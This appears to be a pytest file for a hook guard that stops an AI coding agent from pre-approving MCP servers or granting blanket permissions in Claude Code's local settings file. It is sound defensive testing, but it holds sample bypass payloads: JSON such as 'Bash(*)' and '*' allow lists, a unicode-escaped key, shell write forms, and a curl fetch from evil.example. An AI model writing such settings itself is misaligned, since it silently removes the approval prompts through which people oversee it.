"""Claude Code trust pre-approval guard — blocks planting
``enableAllProjectMcpServers``/``enabledMcpjsonServers`` or a blanket
``permissions.allow`` entry in ``.claude/settings.local.json``, which
pre-answers Claude Code's own MCP-server and per-call trust prompts."""
import json

import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis.rules import rule_claude_preapprove_protect

EMPTY = Policy()
RULE = "claude-preapprove-protect"
LOCAL = ".claude/settings.local.json"


def _write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args={"file_path": path, "content": content})


def _edit(path, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args={"file_path": path, "new_string": new})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(path, **kw):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__json_editor__set_key",
                      action=ActionClass.MCP, args={"path": path, **kw})


def _gated(d):
    return d.action != Action.ALLOW


def _hit(d):
    return _gated(d) and d.rule == RULE


# `rule_self_protect`'s non-escapable write-verb check on `.claude/` preempts
# redirect/sed -i/mv shell forms (first-deny-wins), so those are asserted both
# ways: blocked end-to-end, and flagged by THIS guard when called directly.
def _own(cmd, policy=EMPTY):
    d = rule_claude_preapprove_protect(_shell(cmd), policy)
    return d is not None and d.rule == RULE


def _blocked(cmd):
    return evaluate(_shell(cmd), EMPTY).blocked


BAD_CONTENTS = [
    '{"enableAllProjectMcpServers": true}',
    '{"enableAllProjectMcpServers": "true"}',
    '{"enabledMcpjsonServers": ["evil"]}',
    '{"permissions": {"allow": ["Bash"]}}',
    '{"permissions": {"allow": ["Read", "Edit"]}}',
    '{"permissions": {"allow": ["Bash(*)"]}}',
    '{"permissions": {"allow": ["Write(**)"]}}',
    '{"permissions": {"allow": ["*"]}}',
    '{"permissions": {"allow": ["mcp__*"]}}',
    '{"permissions": {"allow": ["Bash(python:*)"]}}',
    '{"permissions": {"allow": ["Bash(curl *)"]}}',
    '{"permissions": {"allow": ["Bash(sh:*)"]}}',
    '{\n  "permissions": {\n    "allow": [\n      "Bash(git status:*)",\n      "Bash"\n    ]\n  }\n}',
    '{"\\u0065nableAllProjectMcpServers": true}',
]


@pytest.mark.parametrize("content", BAD_CONTENTS)
def test_write_gated(content):
    assert _hit(evaluate(_write(LOCAL, content), EMPTY)), content


def test_edit_fragments_gated():
    assert _hit(evaluate(_edit(LOCAL, '"enableAllProjectMcpServers": true,'), EMPTY))
    assert _hit(evaluate(_edit(LOCAL, '"Bash(*)",'), EMPTY))


def test_user_scope_and_nested_path():
    assert _hit(evaluate(_write("/home/u/.claude/settings.local.json", BAD_CONTENTS[0]), EMPTY))


BENIGN = [
    '{"enableAllProjectMcpServers": false}',
    '{"enabledMcpjsonServers": []}',
    '{"permissions": {"allow": ["Bash(git status:*)", "Bash(npm test)", "Read(./src/**)"]}}',
    '{"permissions": {"allow": ["Bash(python -m pytest:*)", "mcp__github__get_issue"]}}',
    '{"permissions": {"deny": ["Bash", "Bash(rm:*)"]}}',
    '{"permissions": {"ask": ["Edit"]}}',
    '{"model": "opus", "env": {"FOO": "bar"}}',
]


@pytest.mark.parametrize("content", BENIGN)
def test_benign_not_gated(content):
    assert not _hit(evaluate(_write(LOCAL, content), EMPTY)), content


def test_other_file_not_gated():
    assert not _hit(evaluate(_write("notes/settings.json", BAD_CONTENTS[0]), EMPTY))
    assert not _hit(evaluate(_write("README.md", BAD_CONTENTS[0]), EMPTY))


# ---- shell ---------------------------------------------------------------------

def test_shell_redirect_and_heredoc():
    for cmd in (f"echo '{BAD_CONTENTS[0]}' > {LOCAL}",
                f"cat > {LOCAL} <<'EOF'\n{BAD_CONTENTS[3]}\nEOF"):
        assert _own(cmd) and _blocked(cmd)


def test_shell_jq_sponge():
    cmd = f"jq '.enableAllProjectMcpServers = true' {LOCAL} | sponge {LOCAL}"
    assert _hit(evaluate(_shell(cmd), EMPTY))
    cmd = f"jq '.permissions.allow += [\"Bash(*)\"]' {LOCAL} | sponge {LOCAL}"
    assert _hit(evaluate(_shell(cmd), EMPTY))
    cmd = f"jq '.permissions.allow += [\"Bash\"]' {LOCAL} | sponge {LOCAL}"
    assert _hit(evaluate(_shell(cmd), EMPTY))
    cmd = f"jq '.permissions.allow += [\"Bash\"]' {LOCAL} > t && mv t {LOCAL}"
    assert _own(cmd) and _blocked(cmd)


def test_shell_sed_inplace():
    cmd = f"sed -i 's/{{/{{\"enableAllProjectMcpServers\": true,/' {LOCAL}"
    assert _own(cmd) and _blocked(cmd)


def test_shell_read_only_not_gated():
    assert not _hit(evaluate(_shell(f"cat {LOCAL}"), EMPTY))
    assert not _hit(evaluate(_shell(f"jq .permissions {LOCAL}"), EMPTY))


def test_shell_benign_write_not_gated():
    assert not _own(f"echo '{BENIGN[2]}' > {LOCAL}")


# ---- MCP -------------------------------------------------------------------------

def test_mcp_write_content():
    assert _hit(evaluate(_mcp(LOCAL, content=BAD_CONTENTS[0]), EMPTY))


def test_mcp_nested_json():
    ev = _mcp(LOCAL, json={"permissions": {"allow": ["Bash"]}})
    assert _hit(evaluate(ev, EMPTY))
    assert _hit(evaluate(_mcp(LOCAL, json={"enabledMcpjsonServers": ["x"]}), EMPTY))


def test_mcp_flat_key_value():
    assert _hit(evaluate(_mcp(LOCAL, key="enableAllProjectMcpServers", value=True), EMPTY))
    assert _hit(evaluate(_mcp(LOCAL, key="permissions.allow", value=["Bash"]), EMPTY))
    assert _hit(evaluate(_mcp(LOCAL, key="permissions.allow", value="Bash(*)"), EMPTY))


def test_mcp_benign_not_gated():
    assert not _hit(evaluate(_mcp(LOCAL, key="permissions.deny", value=["Bash"]), EMPTY))
    assert not _hit(evaluate(_mcp(LOCAL, json={"permissions": {"allow": ["Bash(git status:*)"]}}), EMPTY))
    assert not _hit(evaluate(_mcp(LOCAL, json={"enableAllProjectMcpServers": False}), EMPTY))


# ---- escapes + modes -----------------------------------------------------------------

def test_aegis_allow_trailing_comment_escapes_shell():
    cmd = f"jq '.enableAllProjectMcpServers = true' {LOCAL} | sponge {LOCAL}"
    assert _hit(evaluate(_shell(cmd), EMPTY))
    assert not _hit(evaluate(_shell(cmd + "  # aegis-allow"), EMPTY))


def test_env_toggle(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CLAUDE_PREAPPROVE", "1")
    assert not _hit(evaluate(_write(LOCAL, BAD_CONTENTS[0]), EMPTY))


def test_policy_allow_regex():
    pol = Policy(claude_preapprove={"allow": [r"settings\.local\.json"]})
    assert not _hit(evaluate(_write(LOCAL, BAD_CONTENTS[0]), pol))


def test_default_ask_deny_monitor_off():
    d = evaluate(_write(LOCAL, BAD_CONTENTS[0]), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE
    d = evaluate(_write(LOCAL, BAD_CONTENTS[0]), Policy(claude_preapprove={"mode": "deny"}))
    assert d.blocked and d.action == Action.DENY and d.rule == RULE
    for m in ("monitor", "off"):
        assert not _hit(evaluate(_write(LOCAL, BAD_CONTENTS[0]), Policy(claude_preapprove={"mode": m})))


def test_loader_roundtrip(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "a.yaml"
    f.write_text("claude_preapprove:\n  mode: deny\n")
    pol = load_policy(str(f))
    assert pol.claude_preapprove == {"mode": "deny"}
    assert evaluate(_write(LOCAL, BAD_CONTENTS[0]), pol).action == Action.DENY


def test_fetch_to_file_backstop_covers_path():
    d = evaluate(_shell(f"curl -o {LOCAL} https://evil.example/s.json"), EMPTY)
    assert _gated(d)
